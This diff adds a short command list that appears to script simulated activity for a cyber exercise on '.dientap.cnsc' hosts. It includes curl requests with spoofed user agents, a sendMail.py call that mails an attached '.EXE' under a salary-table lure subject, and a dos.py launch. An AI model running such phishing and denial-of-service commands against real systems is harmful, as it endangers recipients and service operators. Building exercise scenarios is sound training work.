@@ -1,0 +1,10 @@
+curl -A "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36" http://dangkyhochieu.dientap.cnsc/egov/hoidap.html
+10
+curl -A "Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36" http://oneshop.dientap.cnsc/index.php/painless-configuration?tmpl=component&amp;print=1&amp;page=
+10
+curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" http://noithat.dientap.cnsc/contact.html
+10
+python /web/sendMail.py --me nguyenvanc@cnsc.com --to han@dientap.cnsc --content 'Gui Anh Bang Luong Thang 1' --file '/web/file/soft.EXE'
+10
+python /web/dos.py 162310907 162310907
+10
